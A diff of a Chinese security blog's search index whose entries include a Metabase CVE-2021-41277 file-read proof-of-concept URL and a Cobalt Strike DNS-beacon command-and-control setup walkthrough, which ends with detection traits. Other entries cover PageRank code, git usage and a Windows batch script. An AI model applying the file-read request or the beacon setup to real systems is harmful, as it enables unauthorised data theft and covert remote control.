@@ -1,45 +1,25 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CS_DNS_Beacon</title>
-    <url>/CS-DNS-Beacon/</url>
-    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><ul>
-<li><p>Cobalt strike4.4</p>
-</li>
-<li><p>VPS（服务器）</p>
-</li>
-<li><p>域名</p>
-</li>
+    <title>Metabasegeojson任意文件读取漏洞CVE-2021-41277</title>
+    <url>/CVE-2021-41277-Metabasegeojson%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Metabasegeojson任意文件读取漏洞CVE-2021-41277"><a href="#Metabasegeojson任意文件读取漏洞CVE-2021-41277" class="headerlink" title="Metabasegeojson任意文件读取漏洞CVE-2021-41277"></a>Metabasegeojson任意文件读取漏洞CVE-2021-41277</h1><h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p>​    在受影响的版本中，自定义 GeoJSON 地图（admin-&gt;settings-&gt;maps-&gt;custom maps-&gt;add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
+<li><strong>metabase version &lt; 0.40.5</strong></li>
+<li><strong>metabase version &gt;= 1.0.0, &lt; 1.40.5</strong></li>
 </ul>
-<h2 id="二、域名解析配置"><a href="#二、域名解析配置" class="headerlink" title="二、域名解析配置"></a>二、域名解析配置</h2><p>一条A记录，一条NS记录</p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519163940795.png" alt="image-20220519163940795"></p>
-<h3 id="1、申请一个域名"><a href="#1、申请一个域名" class="headerlink" title="1、申请一个域名"></a>1、申请一个域名</h3><p>​    【WWW.XX#X.TK]</p>
-<h3 id="2、配置解析记录"><a href="#2、配置解析记录" class="headerlink" title="2、配置解析记录"></a>2、配置解析记录</h3><p>​    此次使用的是CDN配置</p>
-<p>​    地址：<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NS记录：NS1  NS1.xxx.tk WWW.xxx.tk </span><br><span class="line"></span><br><span class="line">A记录： A     WWW.xxx.tk   IP</span><br></pre></td></tr></table></figure>
+<h3 id="1、fofa-so搜索"><a href="#1、fofa-so搜索" class="headerlink" title="1、fofa.so搜索"></a>1、fofa.so搜索</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Metabase geojson&quot;</span><br></pre></td></tr></table></figure>
 
-<h3 id="3、等待生效"><a href="#3、等待生效" class="headerlink" title="3、等待生效"></a>3、等待生效</h3><p>​    时间比较久</p>
-<h2 id="三、CS-DNS-Beacon"><a href="#三、CS-DNS-Beacon" class="headerlink" title="三、CS DNS Beacon"></a>三、CS DNS Beacon</h2><h3 id="1、VPS运行服务端"><a href="#1、VPS运行服务端" class="headerlink" title="1、VPS运行服务端"></a>1、VPS运行服务端</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  VPS-IP Password</span><br><span class="line">#注意53端口，如存在服务，需要关闭 netstat -ano | grep 53</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220219004406584.png" alt="image-20220219004406584"></p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;IP&#x2F;api&#x2F;geojson?url&#x3D;file:xxxxx</span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="2、本地机器添加监听"><a href="#2、本地机器添加监听" class="headerlink" title="2、本地机器添加监听"></a>2、本地机器添加监听</h3><p>DNS-HOSTS 使用的是NS的域名</p>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519165639252.png" alt="image-20220519165639252"></p>
-<h3 id="3、生成木马"><a href="#3、生成木马" class="headerlink" title="3、生成木马"></a>3、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519165859802.png" alt="image-20220519165859802"></p>
-<h3 id="4、上线"><a href="#4、上线" class="headerlink" title="4、上线"></a>4、上线</h3><p>​    目标机执行木马，但默认情况下主机信息是黑色，需要执行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checkin </span><br><span class="line">mode dns-txt</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519170235965.png" alt="image-20220519170235965"></p>
-<h2 id="四、CS上线流量特征"><a href="#四、CS上线流量特征" class="headerlink" title="四、CS上线流量特征"></a>四、CS上线流量特征</h2><p>​    受害机器发送大量的请求包，并且很多流量包中请求和响应的的域名较长</p>
-<ul>
-<li>过滤查询域名长度超过一定数值时判定为可疑</li>
-<li>大量请求同一个二级域名，并且查询结果为0.0.0.0，查询状态为成功</li>
-</ul>
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519171432350.png" alt="image-20220519171432350"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220219004247065.png" alt="image-20220219004247065"></p>
 ]]></content>
       <categories>
-        <category>安全</category>
-        <category>Tools</category>
+        <category>漏洞复现</category>
+        <category>Metabasegeojson</category>
       </categories>
       <tags>
         <tag>安全</tag>
@@ -112,28 +92,167 @@
       </tags>
   </entry>
   <entry>
-    <title>Metabasegeojson任意文件读取漏洞CVE-2021-41277</title>
-    <url>/CVE-2021-41277-Metabasegeojson%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="Metabasegeojson任意文件读取漏洞CVE-2021-41277"><a href="#Metabasegeojson任意文件读取漏洞CVE-2021-41277" class="headerlink" title="Metabasegeojson任意文件读取漏洞CVE-2021-41277"></a>Metabasegeojson任意文件读取漏洞CVE-2021-41277</h1><h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p>​    在受影响的版本中，自定义 GeoJSON 地图（admin-&gt;settings-&gt;maps-&gt;custom maps-&gt;add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息</p>
-<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
-<li><strong>metabase version &lt; 0.40.5</strong></li>
-<li><strong>metabase version &gt;= 1.0.0, &lt; 1.40.5</strong></li>
+    <title>CS_DNS_Beacon</title>
+    <url>/CS-DNS-Beacon/</url>
+    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><ul>
+<li><p>Cobalt strike4.4</p>
+</li>
+<li><p>VPS（服务器）</p>
+</li>
+<li><p>域名</p>
+</li>
 </ul>
-<h3 id="1、fofa-so搜索"><a href="#1、fofa-so搜索" class="headerlink" title="1、fofa.so搜索"></a>1、fofa.so搜索</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Metabase geojson&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="二、域名解析配置"><a href="#二、域名解析配置" class="headerlink" title="二、域名解析配置"></a>二、域名解析配置</h2><p>一条A记录，一条NS记录</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519163940795.png" alt="image-20220519163940795"></p>
+<h3 id="1、申请一个域名"><a href="#1、申请一个域名" class="headerlink" title="1、申请一个域名"></a>1、申请一个域名</h3><p>​    【WWW.XX#X.TK]</p>
+<h3 id="2、配置解析记录"><a href="#2、配置解析记录" class="headerlink" title="2、配置解析记录"></a>2、配置解析记录</h3><p>​    此次使用的是CDN配置</p>
+<p>​    地址：<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NS记录：NS1  NS1.xxx.tk WWW.xxx.tk </span><br><span class="line"></span><br><span class="line">A记录： A     WWW.xxx.tk   IP</span><br></pre></td></tr></table></figure>
 
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220219004406584.png" alt="image-20220219004406584"></p>
-<h3 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;IP&#x2F;api&#x2F;geojson?url&#x3D;file:xxxxx</span><br></pre></td></tr></table></figure>
+<h3 id="3、等待生效"><a href="#3、等待生效" class="headerlink" title="3、等待生效"></a>3、等待生效</h3><p>​    时间比较久</p>
+<h2 id="三、CS-DNS-Beacon"><a href="#三、CS-DNS-Beacon" class="headerlink" title="三、CS DNS Beacon"></a>三、CS DNS Beacon</h2><h3 id="1、VPS运行服务端"><a href="#1、VPS运行服务端" class="headerlink" title="1、VPS运行服务端"></a>1、VPS运行服务端</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  VPS-IP Password</span><br><span class="line">#注意53端口，如存在服务，需要关闭 netstat -ano | grep 53</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220219004247065.png" alt="image-20220219004247065"></p>
+<h3 id="2、本地机器添加监听"><a href="#2、本地机器添加监听" class="headerlink" title="2、本地机器添加监听"></a>2、本地机器添加监听</h3><p>DNS-HOSTS 使用的是NS的域名</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519165639252.png" alt="image-20220519165639252"></p>
+<h3 id="3、生成木马"><a href="#3、生成木马" class="headerlink" title="3、生成木马"></a>3、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519165859802.png" alt="image-20220519165859802"></p>
+<h3 id="4、上线"><a href="#4、上线" class="headerlink" title="4、上线"></a>4、上线</h3><p>​    目标机执行木马，但默认情况下主机信息是黑色，需要执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checkin </span><br><span class="line">mode dns-txt</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519170235965.png" alt="image-20220519170235965"></p>
+<h2 id="四、CS上线流量特征"><a href="#四、CS上线流量特征" class="headerlink" title="四、CS上线流量特征"></a>四、CS上线流量特征</h2><p>​    受害机器发送大量的请求包，并且很多流量包中请求和响应的的域名较长</p>
+<ul>
+<li>过滤查询域名长度超过一定数值时判定为可疑</li>
+<li>大量请求同一个二级域名，并且查询结果为0.0.0.0，查询状态为成功</li>
+</ul>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519171432350.png" alt="image-20220519171432350"></p>
 ]]></content>
       <categories>
-        <category>漏洞复现</category>
-        <category>Metabasegeojson</category>
+        <category>安全</category>
+        <category>Tools</category>
       </categories>
       <tags>
         <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pagerank_algorithm</title>
+    <url>/pagerank-algorithm/</url>
+    <content><![CDATA[<h1 id="PAGERANK学习笔记"><a href="#PAGERANK学习笔记" class="headerlink" title="PAGERANK学习笔记"></a>PAGERANK学习笔记</h1><h2 id="一、PageRank简介"><a href="#一、PageRank简介" class="headerlink" title="一、PageRank简介"></a>一、PageRank简介</h2><p>​        PageRank(PR)是谷歌搜索用来在搜索引擎中对网站进行排名的算法，<strong>Sergey Brin and Lawrence Page</strong> 发布了一篇论文《<strong>The Anatomy of a Large-Scale Hypertextual Web Search Engine</strong>.》。其中提出PageRank算法，PageRank算法输出一个概率分布，用于表示随机点击链接的人到达任何特定页面的可能性。可以计算任何大小的文档集合的PageRank。PageRank 计算需要通过集合进行多次传递（称为“迭代”），以调整近似的 PageRank 值，以更贴近理论真实值。</p>
+<p>​    在最初的google paper中介绍这个算法的等式是</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20230731123236589.png" alt="image-20230731123236589"></p>
+<blockquote>
+<p>我们假设页面 A 具有页面 T1…Tn 指向它。参数 d 是一个阻尼系数，可以设置为 0 到 1 之间。我们通常将 d 设置为 0.85。此外，C（A）被定义为从页面A流出的链接数量。</p>
+</blockquote>
+<blockquote>
+<p>PageRanks在网页上形成概率分布，因此所有网页的PageRanks的总和将为1。</p>
+</blockquote>
+<blockquote>
+<p>PageRank可以被认为是用户行为的模型。假设有一个“随机冲浪者”，他随机获得一个网页并不断点击链接，从未点击“返回”，但最终感到无聊并从另一个随机页面开始。随机冲浪者访问页面的概率是其PageRank。而且，d阻尼因子是“随机冲浪者”在每个页面上感到无聊并请求另一个随机页面的概率。一个重要的变化是仅将阻尼因子 d 添加到单个页面或一组页面。这允许个性化，并且几乎不可能故意误导系统以获得更高的排名。</p>
+</blockquote>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1690776602495.png" alt="img"></p>
+<p>图1表示一个有向图，节点A,B,C,D,E,F,H,K表示八个网页，他们的 链接关系如图一箭头所指的方向</p>
+<p>​    入链：从页面流出的链接</p>
+<p>​    出链：从页面访问的链接（可以理解为referer)</p>
+<p>​    在图1中，A的出链有两个，入链有一个，所以A的PR值是</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20230731000617948.png" alt="image-20230731000617948"></p>
+<ul>
+<li>如果一个页面被很多高质量（PR值高的）页面指向，则该页面可以具有很高的PageRank</li>
+</ul>
+<h2 id="二、PageRank在计算的过程时会出现几个问题"><a href="#二、PageRank在计算的过程时会出现几个问题" class="headerlink" title="二、PageRank在计算的过程时会出现几个问题"></a>二、PageRank在计算的过程时会出现几个问题</h2><p>•   等级泄露（Rank Leak) 网页只有入链，没有出链( H )  为了避免PR为0 需要赋值</p>
+<p>•   等级沉没（Rank Sink） 网页只有出链没有入链  (F)为了避免PR为0 需要赋值</p>
+<p>•   Spider Traps 网页和其他节点无链接，只有自己指向自己 (k)</p>
+<h2 id="三、PageRank定义"><a href="#三、PageRank定义" class="headerlink" title="三、PageRank定义"></a>三、PageRank定义</h2><p>假定有N个节点，每个节点到任意一个节点几率相等，那么转移的几率是1/N</p>
+<ul>
+<li>一个网页的PR值=所有入链集合的加权PR之和</li>
+</ul>
+<blockquote>
+<p>uri A为评估页面，B{referer1.referer2}是A入链的集合</p>
+<p>PR(A)=d*(PR(referer1)/referer1的所有出链数量+PR(referer2)/referer2的所有出链数量+…)</p>
+</blockquote>
+<h2 id="四、PageRank随机浏览模型"><a href="#四、PageRank随机浏览模型" class="headerlink" title="四、PageRank随机浏览模型"></a>四、PageRank随机浏览模型</h2><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/wps3.png" alt="img"></p>
+<p>使用迭代法计算Pagerank值【根据图1的范例】</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20230731123311622.png" alt="image-20230731123311622"></p>
+<blockquote>
+<p>将所有节点转换成数字，在将所有入链转换成坐标来得到矩阵</p>
+<p>每行为对应页面的入链  B页面有两个入链D,和E （D和E都有两个出链，那么如果访问关系是按照链接跳转，那么从D和E跳转到B的可能性质都为1/2</p>
+</blockquote>
+<h2 id="五、python完整代码"><a href="#五、python完整代码" class="headerlink" title="五、python完整代码"></a>五、python完整代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">p &#x3D; 0.85  # 引入浏览当前网页的概率为p,假设p&#x3D;0.85</span><br><span class="line"></span><br><span class="line">df &#x3D; pd.read_csv(&#39;file&#x2F;1.csv&#39;)</span><br><span class="line">edges &#x3D; [list(edge) for edge in zip(df[&#39;t1&#39;], df[&#39;t2&#39;])]</span><br><span class="line"></span><br><span class="line"># 根据边获取节点的集合</span><br><span class="line">nodes &#x3D; list(set(np.array(edges).flatten()))</span><br><span class="line"></span><br><span class="line">N &#x3D; len(nodes)</span><br><span class="line"># 将字符串，映射成阿拉伯数字</span><br><span class="line">dict_uri &#x3D; dict(enumerate(nodes))</span><br><span class="line">#将字典键值反转  同时获取空值的id</span><br><span class="line">node_to_num&#x3D;&#123;&#125;</span><br><span class="line">num_isnull&#x3D;-1</span><br><span class="line">for key, val in dict_uri.items():</span><br><span class="line">    node_to_num[val]&#x3D;key</span><br><span class="line">    if val&#x3D;&#x3D;&#39;Q&#39;:</span><br><span class="line">        num_isnull&#x3D;key</span><br><span class="line">for edge in edges:</span><br><span class="line">    edge[0] &#x3D; node_to_num[edge[0]]</span><br><span class="line">    edge[1] &#x3D; node_to_num[edge[1]]</span><br><span class="line"># 生成初步的矩阵</span><br><span class="line">a &#x3D; np.zeros([N, N])</span><br><span class="line">for edge in edges:</span><br><span class="line">    a[edge[1], edge[0]] &#x3D; 1</span><br><span class="line"></span><br><span class="line"># 入链，行a[i]里面的元素都是i的入链</span><br><span class="line">length &#x3D; a.shape[1]  # 网页数量</span><br><span class="line"># 构造转移矩阵</span><br><span class="line"># 出链，行a[i]里面的元素都是i的出链</span><br><span class="line">b &#x3D; np.transpose(a)  # b为a的转置矩阵</span><br><span class="line">m &#x3D; np.zeros((a.shape), dtype&#x3D;float)</span><br><span class="line">for i in range(a.shape[0]):</span><br><span class="line">    for j in range(a.shape[1]):</span><br><span class="line">        # 如果一个节点没有任何出链，Dead Ends</span><br><span class="line">        if b[j].sum() &#x3D;&#x3D; 0:</span><br><span class="line">            b[j] &#x3D; b[j] + np.array([1 &#x2F; length] * length)</span><br><span class="line">        m[i][j] &#x3D; a[i][j] &#x2F; (b[j].sum())  # 完成初始化分配</span><br><span class="line"></span><br><span class="line"># pr值得初始化</span><br><span class="line">v &#x3D; np.zeros((m.shape[0], 1), dtype&#x3D;float)  # 构造一个存放pr值得矩阵</span><br><span class="line">for i in range(m.shape[0]):</span><br><span class="line">    v[i] &#x3D; float(1) &#x2F; m.shape[0]</span><br><span class="line"></span><br><span class="line">count &#x3D; 0</span><br><span class="line">ee &#x3D; np.array([[1 &#x2F; length] * length]).reshape(length, -1)</span><br><span class="line"># 循环100次计算pageRank值</span><br><span class="line">for i in range(1000):</span><br><span class="line">    #  解决spider traps问题，spider traps会导致网站权重向一个节点偏移，将转移矩阵加上打开其他网页的概率1-p</span><br><span class="line">    v &#x3D; p * np.dot(m, v) + (1 - p) * ee</span><br><span class="line">    count +&#x3D; 1</span><br><span class="line"># pageRank值</span><br><span class="line"></span><br><span class="line">t &#x3D; 0</span><br><span class="line">info &#x3D; dict()</span><br><span class="line">for i in v:</span><br><span class="line">    info[dict_uri[t]] &#x3D; list(i)[0]</span><br><span class="line">    # info.append(temp)</span><br><span class="line">    t +&#x3D; 1</span><br><span class="line">pagerank_sorted_values &#x3D; sorted(info.items(), key&#x3D;lambda x: x[1], reverse&#x3D;True)</span><br><span class="line">print(pagerank_sorted_values)</span><br><span class="line">all&#x3D;0</span><br><span class="line">for i in pagerank_sorted_values:</span><br><span class="line">    all+&#x3D;list(i)[1]</span><br><span class="line">print(all)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><p>《<strong>The Anatomy of a Large-Scale Hypertextual Web Search Engine</strong>.》算法论文：<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/334.pdf">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/334.pdf</a></p>
+</li>
+<li><p>《人工智能自然语言处理—PageRank算法和TextRank算法详解》<a href="https://cloud.tencent.com/developer/article/2261595">https://cloud.tencent.com/developer/article/2261595</a></p>
+</li>
+<li><p>机器学习经典算法之PageRank <a href="https://www.cnblogs.com/jpcflyer/p/11180263.html">https://www.cnblogs.com/jpcflyer/p/11180263.html</a></p>
+</li>
+<li><p>PageRank 算法详解<a href="https://blog.csdn.net/qq_41427834/article/details/110262036">https://blog.csdn.net/qq_41427834/article/details/110262036</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>安全研究</category>
+        <category>数据挖掘算法</category>
+      </categories>
+      <tags>
+        <tag>安全研究</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git将本地代码上传到远程仓库</title>
+    <url>/git%E5%B0%86%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
+    <content><![CDATA[<p><strong>1.注册账户</strong><br><a href="https://github.com/">https://github.com/</a><br><strong>2.新建库</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091458521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091851782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>3.git下载</strong><br><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a><br><strong>4.安装</strong><br>       按提示安装</p>
+<p><strong>5.查看ssh是否生成，如果没有</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;xxx@qq.com&quot;</span>  <span class="comment">#注册github时的邮箱</span></span><br></pre></td></tr></table></figure>
+
+<p>如果显示没有这个命令，需要配置环境变量</p>
+<pre><code>   添加git/bin的位置
+</code></pre>
+<p><strong>6.ssh生成后，在id_rsa.pub中，复制里面的 key。</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+
+<pre><code> 测试是否连接成功，
+ 出现hi 用户名  表示已成功
+</code></pre>
+<p><strong>7.设置用户名</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">&quot;name&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>8.设置邮箱</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">&quot;2xxxxxxxxxxx@qq.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>9.上传</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  <span class="comment">#把这个目录变成Git可以管理的仓库</span></span><br><span class="line">git init     </span><br><span class="line">  <span class="comment">#将全部文件添加到仓库</span></span><br><span class="line">git add .   </span><br><span class="line">  <span class="comment">#把文件提交到仓库  &quot;message_board&quot;文件名</span></span><br><span class="line">git commit -m “message_board”</span><br><span class="line">  <span class="comment">#关联远程仓库</span></span><br><span class="line">git remote add origin git@github.com:username/message_board.git</span><br><span class="line">  <span class="comment">#把本地库的所有内容推送到远程库上</span></span><br><span class="line">git push -u origin master </span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>win10家庭版没有组策略解决方式</title>
+    <url>/win10%E5%AE%B6%E5%BA%AD%E7%89%88%E6%B2%A1%E6%9C%89%E7%BB%84%E7%AD%96%E7%95%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<div class="note primary simple"><h5 id="1-新建一个文件"><a href="#1-新建一个文件" class="headerlink" title="1.新建一个文件"></a>1.新建一个文件</h5></div>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img%5Cdocument%5Cgpedit%5C118081416313.png" alt="118081416313"></p>
+<div class="note primary simple"><h5 id="2-将代码放入"><a href="#2-将代码放入" class="headerlink" title="2.将代码放入"></a>2.将代码放入</h5></div>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">pushd &quot;%~dp0&quot;</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txt</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txt</span><br><span class="line"></span><br><span class="line">for &#x2F;f %%i in (&#39;findstr &#x2F;i . List.txt 2^&gt;nul&#39;) do dism &#x2F;online &#x2F;norestart &#x2F;add-package:&quot;C:\Windows\servicing\Packages\%%i&quot;</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
+
+<p>CTRL+C保存</p>
+<div class="note primary simple"><h5 id="3-将文件扩展名改为-bat"><a href="#3-将文件扩展名改为-bat" class="headerlink" title="3.将文件扩展名改为.bat"></a>3.将文件扩展名改为.bat</h5></div>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082125198.png" alt="img"></p>
+<div class="note primary simple"><h5 id="4-右键以管理员身份运行"><a href="#4-右键以管理员身份运行" class="headerlink" title="4.右键以管理员身份运行"></a>4.右键以管理员身份运行</h5></div>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082509921.png" alt="img"></p>
+<h5 id="5-将生成的临时文件list-txt删除"><a href="#5-将生成的临时文件list-txt删除" class="headerlink" title="5.将生成的临时文件list.txt删除"></a>5.将生成的临时文件list.txt删除</h5>]]></content>
+      <tags>
+        <tag>window</tag>
       </tags>
   </entry>
   <entry>
@@ -220,38 +339,6 @@
       </tags>
   </entry>
   <entry>
-    <title>git将本地代码上传到远程仓库</title>
-    <url>/git%E5%B0%86%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
-    <content><![CDATA[<p><strong>1.注册账户</strong><br><a href="https://github.com/">https://github.com/</a><br><strong>2.新建库</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091458521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091851782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>3.git下载</strong><br><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a><br><strong>4.安装</strong><br>       按提示安装</p>
-<p><strong>5.查看ssh是否生成，如果没有</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;xxx@qq.com&quot;</span>  <span class="comment">#注册github时的邮箱</span></span><br></pre></td></tr></table></figure>
-
-<p>如果显示没有这个命令，需要配置环境变量</p>
-<pre><code>   添加git/bin的位置
-</code></pre>
-<p><strong>6.ssh生成后，在id_rsa.pub中，复制里面的 key。</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
-
-<pre><code> 测试是否连接成功，
- 出现hi 用户名  表示已成功
-</code></pre>
-<p><strong>7.设置用户名</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">&quot;name&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>8.设置邮箱</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">&quot;2xxxxxxxxxxx@qq.com&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>9.上传</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  <span class="comment">#把这个目录变成Git可以管理的仓库</span></span><br><span class="line">git init     </span><br><span class="line">  <span class="comment">#将全部文件添加到仓库</span></span><br><span class="line">git add .   </span><br><span class="line">  <span class="comment">#把文件提交到仓库  &quot;message_board&quot;文件名</span></span><br><span class="line">git commit -m “message_board”</span><br><span class="line">  <span class="comment">#关联远程仓库</span></span><br><span class="line">git remote add origin git@github.com:username/message_board.git</span><br><span class="line">  <span class="comment">#把本地库的所有内容推送到远程库上</span></span><br><span class="line">git push -u origin master </span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>cs域前置隐藏</title>
     <url>/cs%E5%9F%9F%E5%89%8D%E7%BD%AE%E9%9A%90%E8%97%8F/</url>
     <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><h3 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h3><p>​    域前置（Domain fronting），是一种能够隐藏连接真实端点来规避互联网审查的技术。在应用层上运作时，域前置使用户能通过 HTTPS 连接到被屏蔽的服务，而表面上像是在与另一个完全不同的站点通信。</p>
@@ -284,71 +371,6 @@
       </categories>
       <tags>
